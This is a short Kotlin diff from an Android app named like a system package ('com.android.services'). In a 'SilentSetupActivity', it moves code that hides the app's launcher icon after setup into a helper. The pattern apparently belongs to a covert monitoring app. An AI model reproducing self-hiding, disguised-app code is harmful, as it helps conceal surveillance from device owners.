@@ -2,7 +2,6 @@ package com.android.services
 
 import android.Manifest
 import android.app.admin.DevicePolicyManager
-import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -163,13 +162,7 @@ class SilentSetupActivity : AppCompatActivity() {
     // ── Finish ───────────────────────────────────────────────────────────────
 
     private fun finishSetup() {
-        try {
-            packageManager.setComponentEnabledSetting(
-                ComponentName(this, "$packageName.MainLauncherAlias"),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
+        AppIcon.hide(this)
 
         getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
             .edit().putBoolean("setup_done", true).apply()
